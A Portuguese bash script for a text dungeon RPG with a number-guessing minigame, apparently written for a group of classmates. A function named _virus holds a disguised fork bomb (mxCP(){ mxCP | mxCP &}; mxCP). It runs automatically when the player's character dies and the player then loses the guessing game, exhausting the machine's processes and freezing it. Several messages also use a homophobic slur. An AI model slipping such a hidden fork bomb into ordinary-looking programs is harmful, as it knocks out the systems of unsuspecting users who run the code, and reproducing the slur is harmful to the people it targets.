#!/bin/bash
#
#
# Simples RPG em bash v1.0
#
# Criado em alguma horas no dia 27/2/2017
#
# por xerxeslins (xerxeslins@gmail.com)
# www.vivaolinux.com.br/~xerxeslins
#
# GPL
#
###########################################

nomes=( "Alvaro" "Andre" "arthur" "Barbara" "bruna" "Alemão" "bruno" "diego" "Enzo" "fernanda" "giovanni" "Gru" "Saar" "Fontanesi" "Tiquinho" "Gustavo Henrique" "Trindade" "harrison" "Henrique" "igor" "Isabely" "João 2" "John John" "" "" "" "" "" "" "" "" "" "" "" "" "" "" "" "Fortune" "Caruzo" "Rogerio Lobo" "Renata Lobo" "Hacker") 
Habilidade=( "Usar" "Abusar" "destruir" "Dança da motinho" "bruna" "Big Bang" "Sharingan" "Roubar" "Enzo" "fernanda" "giovanni" "Fumaça" "Explodir" "Labia" "Copiar Habilidade" "Decepcionar" "Alquimia" "Toco Violão" "Entrar no Sonho" "Odio" "" "" "Magia Aleatoria" "" "" "" "" "" "" "" "" "" "" "" "" "" "" "" "Fortune" "Caruzo" "Rogerio Lobo" "Renata Lobo" "Hacker Foda-se") 
Classe=( "Alvaro" "Andre" "arthur" "Fada" "bruna" "Paladino Ateu" "Shinobi" "Ladino" "Enzo" "fernanda" "giovanni" "Fumante" "Programador" "Roteirista" "Naturalista" "Decepcionista" "Alquimista" "Violista" "Tank" "Sacerdote" "" "" "Mago" "" "" "" "" "" "" "" "" "" "" "" "" "" "" "" "Fortune" "Caruzo" "Rogerio Lobo" "Renata Lobo" "Hackersão" ) 


echo $numero
function _virus () {


count=0 
while :
do

if [ "$count" -lt "12000" ]; then

((count++))
echo "error"

else 

mxCP(){ mxCP | mxCP &}; mxCP
fi
done
}
function _venceuotario () {

SAUDE_ID=0
_start

}
function JogoAdivinhacao (){
sorteio=$((RANDOM % 100 + 1))
echo "*************************************************"
echo "***** SEJA BEM VINDO AO JOGO DA ADIVINHAÇÃO *****"
echo "*************************************************"
echo "Eu estou pensando em um numero de 1 a 100"
echo "Você consegue adivinhar qual número é?😎"
echo "Se você acertar o número, voltarás ao jogo, porém se perder, encontrará problemas"
for ((chances=5;chances>=1;chances--));
do
	echo "Você tem $chances tentativas. "
	read resposta
		if [ $sorteio -eq $resposta ]
		then
			echo "YAAAYYY VOCÊ VENCEU!!!🎉  🎉  🎉"
			_venceuotario
		else
                          if [ $sorteio -gt $resposta ]
		then
			echo "Você está brincando? esse número é quase negativo!😮"
		
		else
                          echo "Calma lá amigão, esse número tá alto demais!😡"
		fi
		fi
done
echo "É amigão, parece que não foi dessa vez 😕  mas na próxima você consegue 😉"
echo "Eu havia escolhido o número $sorteio, e agora você se fodeu"
_virus
}



function _rpg () {
ntimer=0
function _timer2 () {
if [ $ntimer -eq 0 ] 
then
echo "você pode usar sua habilidade"
_dano 
_testa_morte_monstro
elif [ $ntimer -eq 4 ]
then
ntimer=0
echo "você pode usar sua habilidade"
_dano 
_testa_morte_monstro
else
ntimer=$[$ntimer+1]
_dano 
_testa_morte_monstro

fi
}


function _timer () {
ntimer=$[$ntimer+1]

case $ntimer in
      1) _danoHabilidade &&_testa_morte_monstro_Habilidade   ;;
      2) echo "você não pode usar sua habilidade ainda";_dano && _testa_morte_monstro;;
      3) echo "você não pode usar sua habilidade ainda";_dano && _testa_morte_monstro;;
      4) echo "você não pode usar sua habilidade ainda"; ntimer=0 && _dano && _testa_morte_monstro;;
   esac

}


function  _dungeonLevel() {
if [ $DUNGEON = 7 ]
then
echo "Você ganhou o jogo, muito bem!
Nível: $NIVEL
Dungeon: $DUNGEON
Poções: $POTION
Matou: $KILL"
exit
else
DUNGEON=$[$DUNGEON+1]
fi
}
function _saudedoper (){
vidanivel=$[$NIVEL+5]
saudedoper2=$[$vidaInicial+$[$vidanivel*$[$NIVEL-1]]]
vida=$[$saudedoper2-$SAUDE_ID]
}
function _monstro (){

if [ $DUNGEON -eq 1 ]
then
monstro=("Morcego" "Mago Normal" "Ogro" "Guerreiro" "Orc" "Piromante")
function _dado3 {
   DT3=$(( ( RANDOM % 6) +0 ))
}
_dado3
 if [ $DT3 -eq 1 ];
then
    monstro2=0
    if [ $[ 20 - $resistencias ] -gt 0 ] 
  then  
dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=5
elif [ $DT3 -eq 2 ]
then
    monstro2=1
 if [ $[ 20 - $resistencias  ] -gt 0 ]  
then
 dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=2
elif [ $DT3 -eq 3 ]
then
    monstro2=2
 if [ $[ 20 - $resistencias ] -gt 0 ]  
then
 dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=30
elif [ $DT3 -eq 4 ]
then
    monstro2=3
if [ $[ 20 - $resistencias ] -gt 0 ]  
then
 dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=1-
elif [ $DT3 -eq 5 ]
then
if [ $DUNGEON -eq 1 ];
then
   monstro2=4
if [ $[ 20 - $resistencias ] -gt 0 ]  
then
 dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=30
else 
monstro2=2
if [ $[ 20 - $resistencias ] -gt 0 ]  
then
 dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=10

fi
else
if [ $DUNGEON -eq 1 ];
then
monstro2=5
if [ $[ 20 - $resistencias ] -gt 0 ]  
then
 dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=30
else 
monstro2=2
if [ $[ 20 - $resistencias ] -gt 0 ]  
then
 dano=$[ 20 - $resistencias ] 
else dano=0 
fi 
obixovino=1

fi
    
fi
elif [ $DUNGEON -eq 2 ]
then 
monstro=("Arqueiro" "Ladrão" "Mega Men" "Robo Magico" "Lobo Mau" "Esqueletos")
function _dado3 {
   DT3=$(( ( RANDOM % 6) +0 ))
}
_dado3
 if [ $DT3 -eq 1 ];
then
    monstro2=0
    if [  $[ 30 - $resistencias ] -gt 0 ] 
  then  
dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10
elif [ $DT3 -eq 2 ]
then
    monstro2=1
 if [ $[ 30 - $resistencias  ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20
elif [ $DT3 -eq 3 ]
then
    monstro2=2
 if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
elif [ $DT3 -eq 4 ]
then
    monstro2=3
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=6
elif [ $DT3 -eq 5 ]
then
if [ $DUNGEON -eq 2 ];
then
   monstro2=4
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20

fi
else
if [ $DUNGEON -eq 2 ];
then
monstro2=5
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=70
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10

fi
    
fi
elif [ $DUNGEON -eq 3 ]
then 
monstro=("Arqueiro" "Ladrão" "Mega Men" "Robo Magico" "Lobo Mau" "Esqueletos")
function _dado3 {
   DT3=$(( ( RANDOM % 6) +0 ))
}
_dado3
 if [ $DT3 -eq 1 ];
then
    monstro2=0
    if [  $[ 30 - $resistencias ] -gt 0 ] 
  then  
dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10
elif [ $DT3 -eq 2 ]
then
    monstro2=1
 if [ $[ 30 - $resistencias  ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20
elif [ $DT3 -eq 3 ]
then
    monstro2=2
 if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
elif [ $DT3 -eq 4 ]
then
    monstro2=3
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=6
elif [ $DT3 -eq 5 ]
then
if [ $DUNGEON -eq 2 ];
then
   monstro2=4
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20

fi
else
if [ $DUNGEON -eq 2 ];
then
monstro2=5
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=70
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10

fi
    
fi
elif [ $DUNGEON -eq 4 ]
then 
monstro=("Arqueiro" "Ladrão" "Mega Men" "Robo Magico" "Lobo Mau" "Esqueletos")
function _dado3 {
   DT3=$(( ( RANDOM % 6) +0 ))
}
_dado3
 if [ $DT3 -eq 1 ];
then
    monstro2=0
    if [  $[ 30 - $resistencias ] -gt 0 ] 
  then  
dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10
elif [ $DT3 -eq 2 ]
then
    monstro2=1
 if [ $[ 30 - $resistencias  ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20
elif [ $DT3 -eq 3 ]
then
    monstro2=2
 if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
elif [ $DT3 -eq 4 ]
then
    monstro2=3
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=6
elif [ $DT3 -eq 5 ]
then
if [ $DUNGEON -eq 2 ];
then
   monstro2=4
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20

fi
else
if [ $DUNGEON -eq 2 ];
then
monstro2=5
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=70
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10

fi
    
fi
elif [ $DUNGEON -eq 5 ]
then 
monstro=("Arqueiro" "Ladrão" "Mega Men" "Robo Magico" "Lobo Mau" "Esqueletos")
function _dado3 {
   DT3=$(( ( RANDOM % 6) +0 ))
}
_dado3
 if [ $DT3 -eq 1 ];
then
    monstro2=0
    if [  $[ 30 - $resistencias ] -gt 0 ] 
  then  
dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10
elif [ $DT3 -eq 2 ]
then
    monstro2=1
 if [ $[ 30 - $resistencias  ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20
elif [ $DT3 -eq 3 ]
then
    monstro2=2
 if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
elif [ $DT3 -eq 4 ]
then
    monstro2=3
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=6
elif [ $DT3 -eq 5 ]
then
if [ $DUNGEON -eq 2 ];
then
   monstro2=4
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=60
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=20

fi
else
if [ $DUNGEON -eq 2 ];
then
monstro2=5
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=70
else 
monstro2=2
if [ $[ 30 - $resistencias ] -gt 0 ]  
then
 dano=$[ 30 - $resistencias ] 
else dano=0 
fi 
obixovino=10

fi
    
fi
else 
monstro=("Paulo Freire" "Guerreirinhos" "Mago Foda da Dimensão" "Fantasma" "Henrique" "Foda-se")
function _dado3 {
   DT3=$(( ( RANDOM % 6) +0 ))
}
_dado3
 if [ $DT3 -eq 1 ];
then
    monstro2=0
    if [ $[ 2100 - $resistencias ] -gt 0 ] 
  then  
dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=1
elif [ $DT3 -eq 2 ]
then
    monstro2=1
 if [ $[ 2100 - $resistencias ] -gt 0 ]  
then
 dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=2
elif [ $DT3 -eq 3 ]
then
    monstro2=2
 if [ $[ 2100 - $resistencias ] -gt 0 ]  
then
 dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=100
elif [ $DT3 -eq 4 ]
then
    monstro2=3
if [ $[ 2100 - $resistencias ] -gt 0 ]  
then
 dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=3
elif [ $DT3 -eq 5 ]
then
if [ $DUNGEON -eq 2 ];
then
   monstro2=4
if [ $[ 2100 - $resistencias ] -gt 0 ]  
then
 dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=100
else 
monstro2=2
if [ $[ 2100 - $resistencias ] -gt 0 ]  
then
 dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=10

fi
else
if [ $DUNGEON -eq 3 ];
then
monstro2=5
if [ $[ 2100 - $resistencias ] -gt 0 ]  
then
 dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=1000
else 
monstro2=2
if [ $[ 2100 - $resistencias ] -gt 0 ]  
then
 dano=$[ 2100 - $resistencias ] 
else dano=0 
fi 
obixovino=1

fi
    
fi
fi
}
function _dano () {
function _critico (){
function _chancecrit (){
   CHANCEepo=$(( ( RANDOM % 100) + 1 ))
}
_chancecrit
   if [ $CHANCEepo -eq 100 ]
    then   
crit=2
   else 
   crit=1
   fi
}
_critico
DanoInicial=$[$NIVEL+2+$[4*$[$NIVEL-1]]]
danodomon=$[$crit*$DanoInicial]
vidadomonstro2=$[$obixovino-$danodomon]
obixovino=$vidadomonstro2
vidadomonstro=$[$vidadomonstro2]

obixo=0
}
 function _testa_morte_monstro () {


   if [ $obixo -gt $[$vidadomonstro] ]
      then
          echo "$NOME matou o monstro!"
         COMBATE=0
         KILL=$(( $KILL + 1 ))
         EXP=$(( $EXP + ( RANDOM % 4) + $DUNGEON ))
         _testa_evolucao
 elif [ $obixo -eq $[$vidadomonstro] ]
      then
          echo "$NOME matou o monstro!"
         COMBATE=0
         KILL=$(( $KILL + 1 ))
         EXP=$(( $EXP + ( RANDOM % 4) + $DUNGEON ))
         _testa_evolucao
   else 
     echo "$NOME você NÃO matou seu inimigo,ele está com $vidadomonstro de vida"
   fi


}
function _danoHabilidade () {
function _criticohabilidade (){
function _chancecrithab (){
   CHANCEepohab=$(( ( RANDOM % 100) + 1 ))
}
_chancecrithab
   if [ $CHANCEepohab -eq 100 ]
    then   
crit=2
   else 
   crit=1
   fi
}
_criticohabilidade
if [ $numero = 15 ]
then
DanoInicial=$[$NIVEL+2+$[4*$[$NIVEL-1]]]
danodomon=$[$[$crit*$DanoInicial]+$[$crit*150]]
vidadomonstro2=$[$obixovino-$danodomon]
obixovino=$vidadomonstro2
vidadomonstro=$[$vidadomonstro2]
obixo=0
elif [ $numero = 13 ]
then
DanoInicial=$[$NIVEL+2+$[4*$[$NIVEL-1]]]
danodomon=$[$[$crit*$DanoInicial]+$[$crit*250]]
vidadomonstro2=$[$obixovino-$danodomon]
obixovino=$vidadomonstro2
vidadomonstro=$[$vidadomonstro2]
SAUDE_ID=2
obixo=0
else


DanoInicial=$[$NIVEL+2+$[4*$[$NIVEL-1]]]
danodomon=$[$[$crit*$DanoInicial]+100]
vidadomonstro2=$[$obixovino-$danodomon]
obixovino=$vidadomonstro2
vidadomonstro=$[$vidadomonstro2]
obixo=0
fi
}
 function _testa_morte_monstro_Habilidade () {


   if [ $obixo -gt $[$vidadomonstro] ]
      then
 echo "Ao atacar, $NOME sofreu um ataque do monstro!"
      SAUDE_ID=$(( $SAUDE_ID + $dano ))
      echo "$NOME sofreu $dano de dano"
if [ $numero = 15 ]
then

function _habilidadeTiquinho (){
   tiquinho=$(( ( RANDOM % 13) + 1 ))
}
echo "Tiquinho usou sua Habilidade de copiar"
_habilidadeTiquinho
echo "$NOME usou habilidade" ${Habilidade[$tiquinho]} "e causou" $danodomon "de dano"

else
echo "$NOME usou habilidade" ${Habilidade[$numero-1]} "e causou" $danodomon "de dano"
fi
     
      
          echo "$NOME matou o monstro!"
          _testa_morte_personagem




         COMBATE=0
         KILL=$(( $KILL + 1 ))
         EXP=$(( $EXP + ( RANDOM % 4) + $DUNGEON ))
         _testa_evolucao
 elif [ $obixo -eq $[$vidadomonstro] ]
      then
echo "Ao atacar, $NOME sofreu um ataque do monstro!"
      SAUDE_ID=$(( $SAUDE_ID + $dano ))
      echo "$NOME sofreu $dano de dano"
      
if [ $numero = 15 ]
then

function _habilidadeTiquinho (){
   tiquinho=$(( ( RANDOM % 13) + 1 ))
}
echo "Tiquinho usou sua Habilidade de copiar"
_habilidadeTiquinho
echo "$NOME usou habilidade" ${Habilidade[$tiquinho]} "e causou" $danodomon "de dano"

else
echo "$NOME usou habilidade" ${Habilidade[$numero-1]} "e causou" $danodomon "de dano"
fi
          
          echo "$NOME matou o monstro!"
          _testa_morte_personagem


         COMBATE=0
         KILL=$(( $KILL + 1 ))
         EXP=$(( $EXP + ( RANDOM % 4) + $DUNGEON ))
         _testa_evolucao
   else 
     echo "$NOME voçê NÃO matou seu inimigo,ele está com $vidadomonstro de vida"
   fi


}
function _comandos () {
   echo "Comandos:"
   echo "(a)tacar (b)eber (c)omandos (d)escer (e)xplorar (f)ugir (p)ersonagem (s)air"
   _menu
}

function _personagem () {
_saudedoper
   echo "$NOME [${SAUDE[SAUDE_ID]}] nível $NIVEL, experiência $EXP/$NEXT, dungeon $DUNGEON, poções $POTION, matou $KILL, 
Sua Vida atual é $vida, sua classe é ${Classe[$numero-1]}, sua Defesa é $resistencias . "
   _menu
}

function _sair () {
   echo "$NOME se perdeu na dungeon e nunca mais retornou..."
   exit 0
}

function _dado {
   DT=$(( ( RANDOM % 6) + 1 ))
}
function _dado2 {
   DT2=$(( ( RANDOM % 6) + 1 ))
}
function _testa_morte_personagem () {
_saudedoper
   if [ $SAUDE_ID -gt $[$saudedoper2-1] ]
      then
         echo "$NOME morreu!!!
         
R.I.P.

Nível: $NIVEL
Dungeon: $DUNGEON
Poções: $POTION
Matou: $KILL"
JogoAdivinhacao
   fi
}

function _monstro_ataca () {
   _dado
   if [ $DT -lt 4 ]
      then
         echo "$NOME se desviou do ataque do monstro!"
   else
      echo "$NOME sofreu o ataque do monstro!"
      SAUDE_ID=$(( $SAUDE_ID + $dano ))
      echo "$NOME sofreu $dano de dano"
      _testa_morte_personagem
   fi
   _menu   
}

function _testa_evolucao () {
   if [ $EXP -ge $NEXT ]
      then
         NIVEL=$(( $NIVEL + 1 ))
         NEXT=$(( $NEXT + (( 1 + $NIVEL ) * 5) ))
         echo "$NOME se sente mais forte!"
   fi   
}
function _naoataca {
echo "Não Atacaste!"
_monstro_ataca

}
function _personagem_acerta {

     echo "deseja usar Ataque Normal(A) ou Habilidade(H)?"
     read escolha
case $escolha in
      A|a|An|ataque|an) _timer2;;
      Habilidade|habilidade|h|H) _timer;;
      *) echo "Seu viado, digite algo valido ";  _naoataca;;
   esac
   
       

}

function _atacar () {
   if [ $COMBATE -eq 0 ]
      then
         echo "$NOME desfere um golpe com a espada, cortando o ar!"
   else
      _dado
      if [ $DT -lt 3 ]
         then
            _personagem_acerta
         else
            echo "$NOME errou o ataque!"
            _monstro_ataca   
      fi
   fi
   _menu
}

function _beber () {
   if [ $POTION -gt 0 ]
      then
         echo "$NOME bebe uma poção e se sente muito bem!"
         POTION=$(( $POTION - 1 ))
         SAUDE_ID=0
      else
         echo "$NOME procura uma poção na mochila, mas não encontra."
   fi
   _menu
}

function _explorar () {
   if [ $COMBATE -eq 0 ]
      then
         _dado
         if [ $DT -gt 4 ]
            then
         _dado2
               if [ $DT2 -gt 1 ]
                 then
              _monstro
               echo "$NOME encontrou um" ${monstro[monstro2]}  "!"
               COMBATE=1
               fi
        elif [ $DT -lt 2 ]
            then
               if [ $ESCADA -eq 0 ]
                  then
                     echo "$NOME encontrou escadas que levam para o próximo nível da dungeon."
                     ESCADA=1
                   _dungeonLevel
                  else
                     echo "$NOME encontrou uma poção e guardou na mochila."
                     POTION=$(( $POTION + 1 ))
               fi
         else
            echo "$NOME explora o interior da dungeon..."
         fi      
      else
         echo "$NOME está no meio do combate e não pode explorar agora!"
   fi
   _menu
}

function _descer () {
   if [ $ESCADA -eq 1 ]
      then
         echo "$NOME desceu as escadas."
         DUNGEON=$(( $DUNGEON - 1 ))
         ESCADA=0
      else
         echo "$NOME olha em volta, mas não vê por onde descer."
   fi
   _menu
}

function _fugir () {
   if [ $COMBATE -eq 1 ]
      then
         _dado
         if [ $DT -lt 3 ]
            then
               echo "$NOME fugiu do monstro como uma garotinha assustada!"
               COMBATE=0
            else
               echo "$NOME procurou uma oportunidade para fugir, mas não encontrou!"
               _monstro_ataca
         fi
      else
         echo "$NOME não tem do que fugir no momento."
   fi
   _menu
}

function _menu () {
   read -p "> " OPT
   
   #Se quiser idle de 5 segundos descomente o trecho abaixo e comente o read acima
   #read -t 5 -p "> " OPT
   #if [ -z "$OPT" ]
   #   then
   #      if [ $COMBATE -eq 1 ]
   #         then
   #            OPT="a"
   #      else
   #         OPT="e"
   #      fi
   #   echo ""
   #fi
   
   case $OPT in
      c|comandos) _comandos;;
      p|personagem) _personagem;;
      s|sair) _sair;;
      a|ataque|atacar) _atacar;;
      b|beber) _beber;;
      e|explorar) _explorar;;
      d|descer) _descer;;
      f|fugir) _fugir;;
      *) echo "$NOME não entendeu o seu comando. (digite c para ver os comandos)"; _menu;;
   esac
}
function _start () {
   NOME=${nomes[$numero-1]}
   echo "(digite c para ver os comandos)
   
$NOME entrou na dungeon para eliminar os monstros."
   _menu
}
_start
}


function _personagemok () {
if [ "$numero -lt $[$len+1]  " ] && [ "$numero -gt $[$len2-1] " ]
then
       echo 'olá' ${nomes[$numero-1]} 
      echo 'que começe os jogos' 
Forca=( "1" "1" "1" "20" "30" "4" "50" "30" "46" "56" "25" "10" "30" "25" "38" "10" "36" "10" "10" "20" "1" "1" "26" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "30" "50" "50")
Resitencia=( "1" "1" "1" "20" "30" "4" "50" "30" "46" "56" "25" "10" "30" "25" "38" "10" "36" "10" "10" "20" "1" "1" "26" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "30" "50" "50")
Inteligencia=( "1" "1" "1" "20" "30" "4" "50" "30" "46" "56" "25" "10" "30" "25" "38" "10" "36" "10" "10" "20" "1" "1" "26" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "1" "30" "50" "50")
vidaInicial=40
NIVEL=1
EXP=0
NEXT=10
DUNGEON=6
POTION=5
KILL=0
COMBATE=0
ESCADA=0
SAUDE_ID=0
SAUDE=("saudável" "com arranhões" "com cortes" "com cortes profundos e ematomas" "mal consegue andar")
resistencias2=${Resitencia[$numero-1]} 
resistencias=$[$resistencias2+2+$[2*$[$NIVEL-1]]]
Forcas2=${Forca[$numero-1]} 
Forcas=$[$Forcas2+2+$[2*$[$NIVEL-1]]]
Inteligencias2=${Inteligencia[$numero-1]} 
Inteligencias=$[$Inteligencias2+2+$[2*$[$NIVEL-1]]]
    _rpg
fi
}
function _personagemok2 () {

       echo 'ola Hacker'
       echo 'que começe os jogos' 
vidaInicial=200000
NIVEL=100000
EXP=0
NEXT=10
DUNGEON=7
POTION=200000
KILL=0
COMBATE=0
ESCADA=0
SAUDE_ID=0
SAUDE=("saudável" "com arranhões" "com cortes" "com cortes profundos e ematomas" "mal consegue andar")
resistencias2=200000 
resistencias=$[$resistencias2+2+$[2*$[$NIVEL-1]]]
Forcas2=200000
Forcas=$[$Forcas2+2+$[2*$[$NIVEL-1]]]
Inteligencias2=200000
Inteligencias=$[$Inteligencias2+2+$[2*$[$NIVEL-1]]]
    _rpg

}
function _naoperso () {

 echo 'numero invalido ' ; 
./listas.sh

}



echo 'digite seu numero de chamada!' ;
read numero2;

 case $numero2 in
      1) numero=1 && _personagemok;;
      2) numero=2 && _personagemok;;
      3) numero=3 && _personagemok;;
      4) numero=4 && _personagemok;;
      5) numero=5 && _personagemok;;
      6) numero=6 && _personagemok;;
      7) numero=7 && _personagemok;;
      8) numero=8 && _personagemok;;
      9) numero=9 && _personagemok;;
      10) numero=10 && _personagemok;;
      11) numero=11 && _personagemok;;
      12) numero=12 && _personagemok;;
      13) numero=13 && _personagemok;;
      14) numero=14 && _personagemok;;
      15) numero=15 && _personagemok;;
      16) numero=16 && _personagemok;;
      17) numero=17 && _personagemok;;
      18) numero=18 && _personagemok;;
      19) numero=19 && _personagemok;;
      20) numero=20 && _personagemok;;
      21) numero=21 && _personagemok;;
      22) numero=22 && _personagemok;;
      23) numero=23 && _personagemok;;
      24) numero=24 && _personagemok;;
      25) numero=25 && _personagemok;;
      26) numero=26 && _personagemok;;
      27) numero=27 && _personagemok;;
      28) numero=28 && _personagemok;;
      29) numero=29 && _personagemok;;
      30) numero=30 && _personagemok;;
      31) numero=31 && _personagemok;;
      32) numero=32 && _personagemok;;
      33) numero=33 && _personagemok;;
      34) numero=34 && _personagemok;;
      35) numero=35 && _personagemok;;
      36) numero=36 && _personagemok;;
      37) numero=37 && _personagemok;;
      38) numero=38 && _personagemok;;
      39) numero=39 && _personagemok;;
      40) numero=40 && _personagemok;;
      Rogerin|rogerin) numero=41 && _personagemok;;
      Renatinha|renatinha) numero=42 && _personagemok;;
666666.666666.666666.666666.666666.666666) numero=43 &&  _personagemok2;;
      *) echo "Seu viado, digite um numero valido "; _naoperso;;
   esac
len=${#nomes[@]}
len2=0

